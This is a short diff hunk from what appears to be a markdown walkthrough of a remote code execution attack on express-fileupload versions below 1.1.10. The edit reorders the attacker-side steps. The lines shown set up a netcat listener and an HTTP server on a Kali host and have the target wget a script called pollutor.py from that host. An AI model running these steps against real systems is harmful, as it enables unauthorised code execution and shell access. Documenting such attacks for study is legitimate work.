@@ -69,8 +69,8 @@ $ cat package.json
 **`RCE attack to express-fileupload (versions < 1.1.10)`**
 ```bash
 > Kali side:
-$ python3 -m http.server
 $ nc -nlvp 8888
+$ python3 -m http.server
 
 > target-side
 $ wget http://<ip-kali>:8000/pollutor.py
